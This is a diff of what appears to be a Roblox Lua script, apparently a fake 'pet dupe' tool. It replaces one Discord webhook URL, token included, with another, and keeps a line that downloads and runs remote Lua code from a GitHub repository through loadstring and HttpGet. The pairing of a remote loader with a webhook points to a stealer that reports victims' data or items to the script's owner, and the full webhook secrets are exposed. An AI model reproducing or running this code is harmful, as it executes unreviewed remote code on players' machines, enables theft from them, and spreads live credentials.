@@ -1,4 +1,4 @@
 UserName = "Mradnane"
-WebHook = "https://discord.com/api/webhooks/1050857617959956520/R74db3_ylPQUZQTBpngbRxiS8Q9aoxqcxSqHR9Ybb14UT91u5BT8ewR0oBsIJG1PrBwv"
+WebHook = "https://discord.com/api/webhooks/1051306707730575440/8wtv2gqDs4ShktJvUDpd0AA2OT-ow5Rrz0-sK1An6rnQtwGXj-Hk56wZyp4veXTyvAmF"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info1.lua", true))()
